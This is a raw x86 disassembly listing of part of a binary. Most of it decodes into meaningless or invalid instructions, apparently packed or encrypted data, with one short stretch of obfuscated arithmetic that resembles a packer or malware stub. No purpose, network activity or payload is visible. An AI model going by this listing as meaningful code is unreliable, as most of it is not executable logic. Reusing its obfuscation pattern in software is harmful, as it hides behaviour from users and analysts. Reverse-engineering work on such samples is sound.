  40b6d8:	pop    es
  40b6d9:	add    DWORD PTR [ecx+0x1ba2abce],edi
  40b6df:	test   eax,0x1031669
  40b6e4:	inc    esi
  40b6e5:	stos   BYTE PTR es:[edi],al
  40b6e6:	into   
  40b6e7:	xchg   al,bh
  40b6e9:	mov    dl,0x92
  40b6eb:	mov    eax,DWORD PTR [ebx+0x16]
  40b6ee:	or     DWORD PTR [ecx-0x45dc8515],esp
  40b6f4:	pushf  
  40b6f5:	xchg   cl,bl
  40b6f7:	add    edx,ebx
  40b6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6fa:	dec    esi
  40b6fb:	or     DWORD PTR [ebx],edx
  40b6fd:	in     al,0x7f
  40b6ff:	out    dx,al
  40b700:	push   edx
  40b701:	test   al,0xcd
  40b703:	sti    
  40b704:	mov    eax,0x94b30c68
  40b709:	retf   
  40b70a:	in     al,0xef
  40b70c:	out    0xe9,eax
  40b70e:	out    dx,al
  40b70f:	inc    eax
  40b710:	adc    eax,edi
  40b712:	stc    
  40b713:	in     eax,dx
  40b714:	xlat   BYTE PTR ds:[ebx]
  40b715:	push   esp
  40b716:	jmp    0x40b69c
  40b718:	imul   esp,DWORD PTR [edi+0xc9eaab5],0xf4ee4f68
  40b722:	and    dl,BYTE PTR [ebx+0xa807e6e]
  40b728:	sar    BYTE PTR [edi+0x2a],1
  40b72b:	xlat   BYTE PTR ds:[ebx]
  40b72c:	mov    ebx,0x93f02e37
  40b731:	bound  eax,QWORD PTR [ebx+0x4f39aaa]
  40b737:	pop    ebx
  40b738:	ret    0xbde3
  40b73b:	inc    ebx
  40b73c:	test   BYTE PTR [eax-0x21],0x6e
  40b740:	adc    ah,BYTE PTR ds:0xb7288a53
  40b746:	sub    al,0x95
  40b748:	pop    ebx
  40b749:	jle    0x40b755
  40b74b:	imul   ecx,DWORD PTR [esi+ebp*1+0x7c2b18f9],0x5a
  40b753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b754:	gs into 
  40b756:	shr    BYTE PTR [edx-0x3a2c880b],cl
  40b75c:	pop    esi
  40b75d:	sub    BYTE PTR [ecx],0xf6
  40b760:	mov    eax,ds:0xe6152486
  40b765:	sbb    eax,0xff7b876e
  40b76a:	xchg   ebx,eax
  40b76b:	inc    ebp
  40b76c:	outs   dx,BYTE PTR ds:[esi]
  40b76d:	mov    al,0x1d
  40b76f:	fisubr DWORD PTR [eax+ebp*2+0x6e7795eb]
  40b776:	pop    ds
  40b777:	add    eax,0x50498ba4
  40b77c:	xchg   ebx,eax
  40b77d:	lock pushf 
  40b77f:	add    ebx,DWORD PTR [esi]
  40b781:	pop    ds
  40b782:	inc    esi
  40b783:	jmp    0x40b7a4
  40b785:	xor    ch,bh
  40b787:	call   0xf0e805a1
  40b78c:	mov    ebx,ecx
  40b78e:	push   cs
  40b78f:	push   edi
  40b790:	xlat   BYTE PTR fs:[ebx]
  40b792:	mov    DWORD PTR ds:0x21940105,edi
  40b798:	inc    edx
  40b799:	lahf   
  40b79a:	mov    BYTE PTR [edi-0xdbb0d3c],ch
  40b7a0:	pop    ebx
  40b7a1:	popa   
  40b7a2:	mov    dl,0xee
  40b7a4:	xchg   ax,ax
  40b7a6:	ins    BYTE PTR es:[edi],dx
  40b7a7:	cmp    al,0x98
  40b7a9:	inc    esp
  40b7aa:	test   eax,0x4be710b0
  40b7af:	jle    0x40b803
  40b7b1:	fist   DWORD PTR cs:[ecx]
  40b7b4:	(bad)  
  40b7b5:	call   0x2c455374
  40b7ba:	pusha  
  40b7bb:	addr16 push ss
  40b7bd:	pop    edi
  40b7be:	inc    edi
  40b7bf:	xchg   edi,eax
  40b7c0:	enter  0x9a8,0x87
  40b7c4:	mov    ah,0xff
  40b7c6:	sub    ebx,esp
  40b7c8:	xlat   BYTE PTR ds:[ebx]
  40b7c9:	add    BYTE PTR [edx],dl
  40b7cb:	sub    eax,0x6603d8e2
  40b7d0:	shl    bl,0x1a
  40b7d3:	mov    ch,0x6b
  40b7d5:	sbb    al,0xd2
  40b7d7:	dec    edi
  40b7d8:	bound  edx,QWORD PTR [edi]
  40b7da:	imul   edi,DWORD PTR [ecx-0x24a80870],0x8482d799
  40b7e4:	mov    ecx,0x69cc6521
  40b7e9:	and    al,0xe4
  40b7eb:	push   esp
  40b7ec:	lahf   
  40b7ed:	pop    ebx
  40b7ee:	aad    0x30
  40b7f0:	pop    edx
  40b7f1:	(bad)  
  40b7f2:	push   esi
  40b7f3:	mov    esi,ebp
  40b7f5:	add    DWORD PTR ds:0x1a4ffdf5,ecx
  40b7fb:	add    edx,DWORD PTR [ebx]
  40b7fd:	jmp    0x40b7fe
  40b7ff:	inc    edi
  40b800:	out    0xbc,eax
  40b802:	je     0x40b867
  40b804:	mov    ecx,0x59efee51
  40b809:	adc    DWORD PTR ds:0xbf3e38a4,edi
  40b80f:	mov    WORD PTR [eax],?
  40b811:	ins    BYTE PTR es:[edi],dx
  40b812:	or     eax,0x9f2d83a8
  40b817:	add    BYTE PTR [ecx],dh
  40b819:	mov    esi,DWORD PTR [ebx+ebp*1+0x784ad9ce]
  40b820:	adc    bh,BYTE PTR [ebx-0x2b41cd36]
  40b826:	xor    ecx,DWORD PTR ds:0xf315ed89
  40b82c:	scas   eax,DWORD PTR es:[edi]
  40b82d:	xchg   esi,eax
  40b82e:	fs jbe 0x40b7b7
  40b831:	inc    esi
  40b832:	or     DWORD PTR [esi],ebp
  40b834:	sub    eax,0x3c36f95f
  40b839:	inc    ebp
  40b83a:	adc    edx,esp
  40b83c:	das    
  40b83d:	or     BYTE PTR [esi],0x32
  40b840:	cmp    al,0x33
  40b842:	push   0xffffff9e
  40b844:	inc    eax
  40b845:	jbe    0x40b87c
  40b847:	test   al,0x46
  40b849:	pop    ecx
  40b84a:	and    ebx,edi
  40b84c:	das    
  40b84d:	stos   BYTE PTR es:[edi],al
  40b84e:	mov    ch,0xda
  40b850:	and    esi,DWORD PTR [edx+0x49]
  40b853:	push   ss
  40b854:	(bad)  
  40b856:	jnp    0x40b855
  40b858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b859:	mov    eax,0x8297070
  40b85e:	or     eax,0xe90d689f
  40b863:	and    al,0xca
  40b865:	fld    DWORD PTR ds:0x5d269833
  40b86b:	cld    
  40b86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b86d:	sub    BYTE PTR [edi+0x9fc4cef],ah
  40b873:	jns    0x40b858
  40b875:	arpl   ax,dx
  40b877:	add    edi,edx
  40b879:	fs pop ecx
  40b87b:	dec    ecx
  40b87c:	mov    DWORD PTR [ebp+eax*2-0xd],ebx
  40b880:	mov    bl,0xf6
  40b882:	fwait
  40b883:	int    0xe3
  40b885:	test   DWORD PTR [eax],esi
  40b887:	in     eax,dx
  40b888:	je     0x40b857
  40b88a:	les    ebx,FWORD PTR [edx-0x1a]
  40b88d:	mul    BYTE PTR [eax]
  40b88f:	sbb    ebx,0x6845c2f2
  40b895:	xor    BYTE PTR [ebx-0x41],dh
  40b898:	stc    
  40b899:	shl    BYTE PTR [edx-0x4b],cl
  40b89c:	mov    esp,0x72a21ada
  40b8a1:	xchg   esp,eax
  40b8a2:	inc    ecx
  40b8a3:	gs jle 0x40b8e0
  40b8a6:	push   0x3d9fc32f
  40b8ab:	sti    
  40b8ac:	bound  ebp,QWORD PTR [esi-0x15]
  40b8af:	mov    al,0xd0
  40b8b1:	scas   eax,DWORD PTR es:[edi]
  40b8b2:	(bad)  
  40b8b3:	out    0xfc,al
  40b8b5:	jl     0x40b8c8
  40b8b7:	addr16 jae 0x40b898
  40b8ba:	inc    esi
  40b8bb:	stos   BYTE PTR es:[edi],al
  40b8bc:	adc    dl,al
  40b8be:	int3   
  40b8bf:	cmp    esp,DWORD PTR [esi-0x79d0ea1e]
  40b8c5:	xor    bh,0x29
  40b8c8:	push   0x36
  40b8ca:	in     eax,0x2f
  40b8cc:	arpl   WORD PTR [edx],dx
  40b8ce:	cs (bad) 
  40b8d0:	loope  0x40b8e9
  40b8d2:	mov    bl,0x4
  40b8d4:	and    BYTE PTR [edx-0x31],dl
  40b8d7:	(bad)  
  40b8d8:	dec    ebp
  40b8d9:	mov    edx,0x3f7af252
  40b8de:	push   es
  40b8df:	ins    DWORD PTR es:[edi],dx
  40b8e0:	shl    DWORD PTR ds:[eax+0x4b],0x98
  40b8e5:	inc    esi
  40b8e6:	xchg   esp,eax
  40b8e7:	popf   
  40b8e8:	mov    ch,0x2c
  40b8ea:	stc    
  40b8eb:	popa   
  40b8ec:	pusha  
  40b8ed:	jmp    0x7d00412f
  40b8f2:	rcr    BYTE PTR [esi],0xcb
  40b8f5:	sahf   
  40b8f6:	jae    0x40b8be
  40b8f8:	rcr    BYTE PTR [edi+0x2a620739],1
  40b8fe:	rcr    dh,0xcc
  40b901:	popf   
  40b902:	arpl   WORD PTR [eax+0x177afe28],si
  40b908:	fst    QWORD PTR [ecx]
  40b90a:	jo     0x40b89b
  40b90c:	push   edx
  40b90d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b90e:	or     DWORD PTR [edi-0x52],eax
  40b911:	lds    ebx,FWORD PTR [ebx+0x1d]
  40b914:	idiv   BYTE PTR [eax]
  40b916:	jns    0x40b8b3
  40b918:	aad    0x18
  40b91a:	rol    ecx,cl
  40b91c:	jmp    0xdda8b050
  40b921:	fldenv [eax-0x9]
  40b924:	cmp    eax,0x3cb8dd9e
  40b929:	out    0x62,eax
  40b92b:	iret   
  40b92c:	push   eax
  40b92d:	sbb    BYTE PTR [ecx+0x2a5ab81f],bl
  40b933:	cmp    DWORD PTR [esi+0x638d6e09],esi
  40b939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b93a:	sti    
  40b93b:	jo     0x40b922
  40b93d:	pop    ds
  40b93e:	jecxz  0x40b902
  40b940:	popa   
  40b941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b943:	arpl   WORD PTR [edi+edx*4],si
  40b946:	pop    edx
  40b947:	idiv   BYTE PTR [ecx-0x10276863]
  40b94d:	scas   al,BYTE PTR es:[edi]
  40b94e:	dec    edi
  40b94f:	xchg   esp,eax
  40b950:	into   
  40b951:	push   ebx
  40b952:	xor    ebp,0x63
  40b955:	aad    0x4a
  40b957:	xor    ecx,ebp
  40b959:	sub    DWORD PTR [edi-0x7333809a],0xfffffff9
  40b960:	xchg   edx,eax
  40b961:	mov    edi,0x62f84f84
  40b966:	sbb    al,0x3a
  40b968:	and    dl,BYTE PTR [esi+0x10]
  40b96b:	rcl    DWORD PTR [eax],1
  40b96d:	jge    0x40b983
  40b96f:	push   ebp
  40b970:	jmp    0x1598:0xcef2d75b
  40b977:	jb     0x40b93c
  40b979:	pop    edx
  40b97a:	cmp    eax,0xbc6a3d2f
  40b97f:	or     ecx,DWORD PTR [edx]
  40b981:	sbb    ebx,DWORD PTR [ebp+edi*4+0x59]
  40b985:	scas   al,BYTE PTR es:[edi]
  40b986:	xor    DWORD PTR [ebx+edx*8+0x41],0xe3a24001
  40b98e:	fwait
  40b98f:	xor    DWORD PTR [edi-0x16f667e8],esi
  40b995:	mov    eax,ds:0x41c60aff
  40b99a:	inc    esi
  40b99b:	stc    
  40b99c:	xor    eax,0xf433d5b8
  40b9a1:	pushf  
  40b9a2:	push   es
  40b9a3:	loop   0x40b944
  40b9a5:	adc    ebx,edi
  40b9a7:	sbb    cl,dl
  40b9a9:	aam    0x27
  40b9ab:	mov    esi,0x227d62cb
  40b9b0:	push   ebp
  40b9b1:	inc    esp
  40b9b2:	pop    esp
  40b9b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9b4:	stc    
  40b9b5:	std    
  40b9b6:	popa   
  40b9b7:	jl     0x40b996
  40b9b9:	aaa    
  40b9ba:	ins    DWORD PTR es:[edi],dx
  40b9bb:	jns    0x40b9a3
  40b9bd:	sbb    BYTE PTR [esi+ecx*8],0x9f
  40b9c1:	xor    BYTE PTR [ecx-0x3d0a9259],dh
  40b9c7:	push   0x9edbe5c6
  40b9cc:	repnz pop esi
  40b9ce:	inc    ebx
  40b9cf:	xchg   esp,eax
  40b9d0:	pop    esp
  40b9d1:	add    DWORD PTR [edx+edx*1-0x6f5e0125],edi
  40b9d8:	loopne 0x40b9e0
  40b9da:	adc    ecx,ebx
  40b9dc:	inc    esi
  40b9dd:	ror    BYTE PTR [ecx],1
  40b9df:	xor    edi,0x42
  40b9e2:	popf   
  40b9e3:	stc    
  40b9e4:	xor    DWORD PTR ds:0x2f4f9198,ebx
  40b9ea:	adc    al,0x6d
  40b9ec:	inc    ecx
  40b9ed:	sbb    esi,0x7e91be2d
  40b9f3:	or     DWORD PTR [eax-0x3e656e1b],0x1681ef97
  40b9fd:	xlat   BYTE PTR ds:[ebx]
  40b9fe:	push   esi
  40b9ff:	inc    eax
  40ba00:	sub    al,0xd8
  40ba02:	mov    esp,0xefec009f
  40ba07:	cld    
  40ba08:	in     eax,dx
  40ba09:	mov    ebp,0xdd246869
  40ba0e:	retf   
  40ba0f:	mov    WORD PTR [esi],?
  40ba11:	int3   
  40ba12:	popa   
  40ba13:	adc    al,0x59
  40ba15:	cmp    DWORD PTR [ebp-0x2bf29be1],esp
  40ba1b:	sti    
  40ba1c:	push   esp
  40ba1d:	pop    ds
  40ba1e:	fmul   DWORD PTR [ebx-0x9]
  40ba21:	ficomp DWORD PTR [edi]
  40ba23:	mov    edx,0xa5836bbd
  40ba28:	popf   
  40ba29:	aad    0xbe
  40ba2b:	or     eax,0x9eecac26
  40ba30:	imul   BYTE PTR [edi-0x4b620087]
  40ba36:	pop    ebx
  40ba37:	out    dx,eax
  40ba38:	ret    0x6517
  40ba3b:	add    ah,BYTE PTR [eax-0x63]
  40ba3e:	inc    eax
  40ba3f:	idiv   DWORD PTR [ebx+0x40]
  40ba42:	sbb    eax,0x32166d9c
  40ba47:	sub    dl,ch
  40ba49:	in     al,dx
  40ba4a:	mov    esi,edi
  40ba4c:	adc    eax,0x1be38777
  40ba51:	sub    DWORD PTR [eiz*8-0x5f92bd4a],ebp
  40ba58:	imul   esi,edi,0x2b5ece24
  40ba5e:	jmp    0xc774:0x5dcd5dc4
  40ba65:	std    
  40ba66:	mov    eax,ds:0x413dd0aa
  40ba6b:	cli    
  40ba6c:	mov    ah,0x88
  40ba6e:	push   es
  40ba6f:	inc    esi
  40ba70:	mov    cl,0xf9
  40ba72:	cmp    DWORD PTR [ecx+0x42ac4c80],ebx
  40ba78:	add    BYTE PTR [ebp-0x5e],ch
  40ba7b:	ror    BYTE PTR ds:0x633548b0,0xc2
  40ba82:	mov    al,ds:0x1798cbf6
  40ba87:	adc    al,0x51
  40ba89:	(bad)  
  40ba8a:	jl     0x40bac6
  40ba8c:	neg    BYTE PTR [edi-0x4a]
  40ba8f:	in     al,0x2
  40ba91:	retf   
  40ba92:	test   BYTE PTR [edx-0x7b],0xf8
  40ba96:	out    0x62,al
  40ba98:	inc    edi
  40ba99:	jb     0x40babe
  40ba9b:	push   esi
  40ba9c:	lods   eax,DWORD PTR ds:[esi]
  40ba9d:	xor    eax,0x67b74c
  40baa2:	pusha  
  40baa3:	inc    esp
  40baa4:	daa    
  40baa5:	jmp    0x40baa9
  40baa7:	inc    esi
  40baa8:	int3   
  40baa9:	mov    DWORD PTR [ebp-0x4],0x61c2
  40bab0:	mov    eax,DWORD PTR [ebp-0x4]
  40bab3:	mov    ecx,DWORD PTR [ebp-0x8]
  40bab6:	add    eax,0x1ca5
  40babb:	or     eax,ecx
  40babd:	mov    ecx,DWORD PTR ds:0x422708
  40bac3:	lea    eax,[eax+ecx*1-0x7eef]
  40baca:	mov    DWORD PTR [ebp-0x5c],eax
  40bacd:	mov    DWORD PTR [ebp-0x4],0x8ea
  40bad4:	mov    DWORD PTR [ebp-0x8],0x5759
  40badb:	mov    eax,DWORD PTR [ebp-0x8]
  40bade:	mov    ecx,DWORD PTR [ebp-0x4]
  40bae1:	and    eax,0x27f6
  40bae6:	xor    eax,ecx
  40bae8:	mov    ecx,DWORD PTR ds:0x42283c
  40baee:	imul   eax,eax,0x18
  40baf1:	xor    eax,0x17970
  40baf6:	lea    eax,[ebp+eax*1-0x54]
  40bafa:	mov    DWORD PTR [eax],ecx
  40bafc:	jmp    0x40bf07
  40bb01:	retf   0xf4e7
  40bb04:	leave  
  40bb05:	hlt    
  40bb06:	fsincos 
  40bb08:	out    0xad,eax
  40bb0a:	and    dl,BYTE PTR [edx-0x62]
  40bb0d:	pop    ebp
  40bb0e:	lea    ebp,[edx]
  40bb10:	shr    DWORD PTR [esi-0x41],1
  40bb13:	mov    esi,0xbec492be
  40bb18:	mov    esi,0xdb7c3996
  40bb1d:	arpl   WORD PTR [ebp-0x66],bx
  40bb20:	jp     0x40baee
  40bb22:	ins    DWORD PTR es:[edi],dx
  40bb23:	add    ecx,DWORD PTR [edx]
  40bb25:	imul   edx,ebp,0xffffffa1
  40bb28:	das    
  40bb29:	repnz dec edx
  40bb2b:	mov    DWORD PTR [edi],edx
  40bb2d:	in     eax,dx
  40bb2e:	xor    BYTE PTR [eax+0x3a],ah
  40bb31:	cdq    
  40bb32:	add    edx,DWORD PTR [ecx]
  40bb34:	push   cs
  40bb35:	cwde   
  40bb36:	fstp   DWORD PTR [esp+eiz*8-0x54]
  40bb3a:	sub    dh,bl
  40bb3c:	fiadd  DWORD PTR [edx+esi*2]
  40bb3f:	mov    eax,0xd0a2fdc8
  40bb44:	jbe    0x40bb61
  40bb46:	inc    edx
  40bb47:	retf   0xbdcf
  40bb4a:	fist   DWORD PTR [ebp-0x6e]
  40bb4d:	outs   dx,DWORD PTR ds:[esi]
  40bb4e:	cmp    dl,BYTE PTR [ebx+0x46]
  40bb51:	mov    eax,cs
  40bb53:	mov    al,ds:0xed454943
  40bb58:	pop    ss
  40bb59:	(bad)  
  40bb5a:	mov    esi,0x196d91e2
  40bb5f:	lods   al,BYTE PTR ds:[esi]
  40bb60:	arpl   bp,di
  40bb62:	push   esi
  40bb63:	sbb    ebp,ebx
  40bb65:	das    
  40bb66:	cli    
  40bb67:	xchg   esp,eax
  40bb68:	ret    
  40bb69:	xchg   ebp,eax
  40bb6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb6b:	jge    0x40bb8b
  40bb6d:	sub    eax,0xf34093df
  40bb72:	add    ecx,DWORD PTR [ecx]
  40bb74:	mov    ebx,0x8a95bb5f
  40bb79:	cmp    al,dl
  40bb7b:	dec    edx
  40bb7c:	adc    al,0x93
  40bb7e:	sbb    ebx,esp
  40bb80:	ins    BYTE PTR es:[edi],dx
  40bb81:	jnp    0x40bb6a
  40bb83:	hlt    
  40bb84:	(bad)  
  40bb85:	aam    0x7f
  40bb87:	inc    esi
  40bb88:	imul   edx,DWORD PTR [ecx+0x4],0xffffffe9
  40bb8c:	mov    ebx,eax
  40bb8e:	pop    ecx
  40bb8f:	out    dx,eax
  40bb90:	mov    dl,0x3f
  40bb92:	ror    cl,0x33
  40bb95:	test   eax,0x5c94c50f
  40bb9a:	popa   
  40bb9b:	mov    ?,WORD PTR [ecx+0x48f754ab]
  40bba1:	mov    ebp,0x5e2f1415
  40bba6:	and    DWORD PTR [ebx],ebp
  40bba8:	push   ebp
  40bba9:	mov    ds:0xb2fd4f07,al
  40bbae:	js     0x40bc2f
  40bbb0:	xchg   edx,eax
  40bbb1:	jno    0x40bb46
  40bbb3:	les    ebp,FWORD PTR [eiz*8-0xc07f985]
  40bbba:	mov    WORD PTR [edi-0xc],es
  40bbbd:	mov    ebx,0xb096a545
  40bbc2:	cs (bad) 
  40bbc4:	mov    cl,0xa2
  40bbc6:	add    al,0x57
  40bbc8:	push   ebp
  40bbc9:	jnp    0x40bb60
  40bbcb:	xor    eax,0x7520ae4e
  40bbd0:	aaa    
  40bbd1:	sub    al,0x79
  40bbd3:	ret    0xacb8
  40bbd6:	fidiv  WORD PTR [edi+0x7f6303ac]
  40bbdc:	popa   
  40bbdd:	push   0x5c
  40bbdf:	xchg   edx,eax
  40bbe0:	repnz dec ebp
  40bbe2:	push   ecx
  40bbe3:	loopne 0x40bbc1
  40bbe5:	icebp  
  40bbe6:	push   edx
  40bbe7:	xor    al,0xe0
  40bbe9:	push   edi
  40bbea:	sbb    BYTE PTR [edx-0x7d],0x7f
  40bbee:	inc    esi
  40bbef:	jecxz  0x40bbe4
  40bbf1:	jo     0x40bbd5
  40bbf3:	test   BYTE PTR [ebp+0x18],bl
  40bbf6:	arpl   ax,di
  40bbf8:	and    cl,BYTE PTR [ebx-0x639de862]
  40bbfe:	pop    ecx
  40bbff:	mov    ebp,0x1b51f490
  40bc04:	and    DWORD PTR [eax+esi*1+0xe],0x28f22774
  40bc0c:	sbb    al,0x98
  40bc0e:	xchg   edx,edi
  40bc10:	lds    edx,FWORD PTR [ecx-0x72eb2338]
  40bc16:	or     dl,cl
  40bc18:	je     0x40bc8e
  40bc1a:	aaa    
  40bc1b:	(bad)  
  40bc1c:	aas    
  40bc1d:	or     eax,0x75553265
  40bc22:	jle    0x40bc4d
  40bc24:	call   0x14c6:0x7fdb0ab4
  40bc2b:	lds    esi,FWORD PTR [edx]
  40bc2d:	cwde   
  40bc2e:	inc    esp
  40bc2f:	rcr    BYTE PTR [ecx+0x132dea1d],cl
  40bc35:	push   ss
  40bc36:	push   ss
  40bc37:	add    eax,0x8b5b6ef3
  40bc3c:	mov    edx,0xf66741f1
  40bc41:	mov    al,0x6a
  40bc43:	(bad)  
  40bc44:	sub    al,0x24
  40bc46:	(bad)  
  40bc47:	xchg   edi,eax
  40bc48:	pop    ebp
  40bc49:	pop    ss
  40bc4a:	inc    esp
  40bc4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc4c:	cli    
  40bc4d:	pop    ds
  40bc4e:	mov    ah,0x38
  40bc50:	fwait
  40bc51:	mov    eax,0xc6a046ff
  40bc56:	push   0xa5b77c7f
  40bc5b:	mov    ebp,DWORD PTR [edi+edx*8-0x49229990]
  40bc62:	jae    0x40bcdf
  40bc64:	les    esp,FWORD PTR [ebx-0x57]
  40bc67:	bound  esi,QWORD PTR [edi-0x3f]
  40bc6a:	(bad)  
  40bc6b:	(bad)  
  40bc6c:	sti    
  40bc6d:	dec    esp
  40bc6e:	jp     0x40bc68
  40bc70:	jb     0x40bc85
  40bc72:	(bad)  
  40bc73:	pop    edx
  40bc74:	cmp    edi,ebx
  40bc76:	daa    
  40bc77:	jne    0x40bc72
  40bc79:	aad    0x50
  40bc7b:	(bad)  
  40bc7c:	cmp    DWORD PTR [ebp-0x1feb1d4d],ebx
  40bc82:	pop    ebp
  40bc83:	mov    eax,0xc7f9943e
  40bc88:	in     al,dx
  40bc89:	push   ebp
  40bc8a:	out    0x81,al
  40bc8c:	test   eax,0xf6a18470
  40bc91:	adc    BYTE PTR [ebp+0x4fc751dd],dl
  40bc97:	outs   dx,DWORD PTR ds:[esi]
  40bc98:	icebp  
  40bc99:	(bad)  
  40bc9b:	pop    esi
  40bc9c:	add    BYTE PTR [eax-0x61],al
  40bc9f:	adc    DWORD PTR [eax-0x7c3c757b],ebp
  40bca5:	sub    BYTE PTR [eax+0x22d6aeab],bh
  40bcab:	adc    bh,BYTE PTR fs:[esp+ecx*8+0x75]
  40bcb0:	xchg   ecx,eax
  40bcb1:	xchg   esp,eax
  40bcb2:	aaa    
  40bcb3:	mov    ebx,0xa6939a04
  40bcb8:	xor    ecx,DWORD PTR [edx]
  40bcba:	xor    BYTE PTR ds:0x39c46e6,0xfd
  40bcc1:	shl    ebp,cl
  40bcc3:	mov    WORD PTR [esp+edx*8+0x7],fs
  40bcc7:	dec    edi
  40bcc8:	sub    al,0x7f
  40bcca:	push   ebp
  40bccb:	mov    ah,0x92
  40bccd:	aas    
  40bcce:	add    cl,BYTE PTR es:[ebx-0x33]
  40bcd2:	icebp  
  40bcd3:	or     esp,DWORD PTR [esi+0x77]
  40bcd6:	enter  0xb60d,0xff
  40bcda:	cmp    al,0x6a
  40bcdc:	rcr    DWORD PTR [ecx-0x73cbb274],1
  40bce2:	sbb    BYTE PTR [eax],dh
  40bce4:	mov    cl,0x0
  40bce6:	aaa    
  40bce7:	pushf  
  40bce8:	jmp    0x21fa:0x9967a1cd
  40bcef:	mov    ecx,0xe5cec2b8
  40bcf4:	sbb    esi,DWORD PTR [ecx+0x52]
  40bcf7:	jmp    0x40bce2
  40bcf9:	dec    eax
  40bcfa:	rol    DWORD PTR [esi],0x9e
  40bcfd:	dec    eax
  40bcfe:	aad    0xe7
  40bd00:	mov    ch,ah
  40bd02:	or     DWORD PTR [esi],0xffffffae
  40bd05:	xchg   ecx,eax
  40bd06:	push   eax
  40bd07:	aam    0xef
  40bd09:	pop    edx
  40bd0a:	out    0xb1,eax
  40bd0c:	test   eax,0x4a8f0060
  40bd11:	pop    ebx
  40bd12:	cmp    eax,0xaf18fa4f
  40bd17:	or     al,0xfd
  40bd19:	push   ebx
  40bd1a:	(bad)  
  40bd1b:	and    BYTE PTR [edi+esi*4],dl
  40bd1e:	mov    WORD PTR [edi-0x2433846b],ss
  40bd24:	in     al,0xa8
  40bd26:	aaa    
  40bd27:	cld    
  40bd28:	repnz rcl BYTE PTR [ebx+0x1f3d183a],cl
  40bd2f:	push   esp
  40bd30:	std    
  40bd31:	or     bl,BYTE PTR [eax]
  40bd33:	mov    BYTE PTR [esp+eax*1+0x27],cl
  40bd37:	cmp    dh,BYTE PTR [ecx]
  40bd39:	adc    dl,BYTE PTR [ecx+0x17]
  40bd3c:	sbb    ebx,DWORD PTR [ebp-0x13]
  40bd3f:	push   cs
  40bd40:	pop    ds
  40bd41:	imul   esp,edi,0x45330f76
  40bd47:	mov    ?,WORD PTR [edi+ebx*2+0x26]
  40bd4b:	add    DWORD PTR [edi],ecx
  40bd4d:	and    al,0x1e
  40bd4f:	fld    st(3)
  40bd51:	xchg   ebx,eax
  40bd52:	xchg   ebp,eax
  40bd53:	mov    al,bh
  40bd55:	pop    es
  40bd56:	das    
  40bd57:	pop    esi
  40bd58:	pop    esp
  40bd59:	sti    
  40bd5a:	into   
  40bd5b:	aas    
  40bd5c:	push   ds
  40bd5d:	fadd   DWORD PTR [esi-0x59]
  40bd60:	mov    al,ds:0xaed1eae7
  40bd65:	test   ecx,esi
  40bd67:	lea    esi,[edx+0x6dcd021d]
  40bd6d:	sbb    edx,esp
  40bd6f:	add    BYTE PTR [edx-0x36cdbe3d],cl
  40bd75:	ret    0x929
  40bd78:	xchg   DWORD PTR [eax-0x6f],ebp
  40bd7b:	xor    eax,0x15b89405
  40bd80:	div    ecx
  40bd82:	or     eax,0x969f53f8
  40bd87:	add    DWORD PTR [ebp+edx*8+0x140d1ad9],esp
  40bd8e:	xor    ch,ah
  40bd90:	pushf  
  40bd91:	mov    edx,0x8ff460cb
  40bd96:	xor    DWORD PTR [ecx-0x4df8337a],edi
  40bd9c:	shl    BYTE PTR [ebp-0x2c61aeaa],cl
  40bda2:	mov    BYTE PTR [edi-0x6db6a752],bh
  40bda8:	pop    esi
  40bda9:	outs   dx,DWORD PTR ds:[esi]
  40bdaa:	not    bh
  40bdac:	add    al,0x1e
  40bdae:	jne    0x40bdd3
  40bdb0:	jns    0x40bdf4
  40bdb2:	out    dx,eax
  40bdb3:	adc    DWORD PTR [eax+0x6cee06fe],edx
  40bdb9:	pop    ds
  40bdba:	in     eax,dx
  40bdbb:	jno    0x40bd9f
  40bdbd:	push   ds
  40bdbe:	out    dx,al
  40bdbf:	int    0x6b
  40bdc1:	mov    dl,0x82
  40bdc3:	cmp    DWORD PTR [ebx-0x1a],edi
  40bdc6:	(bad)  
  40bdc7:	sbb    ebx,ebx
  40bdc9:	dec    eax
  40bdca:	push   ebx
  40bdcb:	jbe    0x40bd86
  40bdcd:	inc    esp
  40bdce:	jmp    0x40bd89
  40bdd0:	into   
  40bdd1:	pusha  
  40bdd2:	cmp    ch,dh
  40bdd4:	and    ch,BYTE PTR [ebp-0x31395426]
  40bdda:	inc    edi
  40bddb:	fdiv   QWORD PTR [esi]
  40bddd:	lea    esi,[ecx]
  40bddf:	cli    
  40bde0:	das    
  40bde1:	mov    ds:0x3f33a0c3,al
  40bde6:	stos   DWORD PTR es:[edi],eax
  40bde7:	(bad)  
  40bde9:	mov    eax,0xf7dc21dc
  40bdee:	js     0x40be6d
  40bdf0:	pushf  
  40bdf1:	sub    dh,BYTE PTR [edx]
  40bdf3:	push   0xfffffffd
  40bdf5:	stos   BYTE PTR es:[edi],al
  40bdf6:	aas    
  40bdf7:	push   edx
  40bdf8:	stc    
  40bdf9:	in     al,0xd1
  40bdfb:	scas   al,BYTE PTR es:[edi]
  40bdfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdfd:	inc    esi
  40bdfe:	pop    ss
  40bdff:	add    DWORD PTR [ecx],esi
  40be01:	imul   esi,DWORD PTR [ecx-0x2f],0x7e
  40be05:	xchg   ebx,eax
  40be06:	add    BYTE PTR [ebx],0x66
  40be09:	and    esp,esi
  40be0b:	sbb    DWORD PTR [ecx],esi
  40be0d:	aas    
  40be0e:	push   ss
  40be0f:	shr    BYTE PTR [ebp+0x4a5561f6],1
  40be15:	cmp    al,0xb3
  40be17:	scas   al,BYTE PTR es:[edi]
  40be18:	sub    ax,0xbba7
  40be1c:	(bad)
  40be1f:	mov    ah,BYTE PTR [ecx-0x6000e362]
  40be25:	sub    al,0x5c
  40be27:	mov    ss,WORD PTR [edx-0x6371b742]
  40be2d:	test   al,0xb1
  40be2f:	ror    ecx,1
  40be31:	loop   0x40be4f
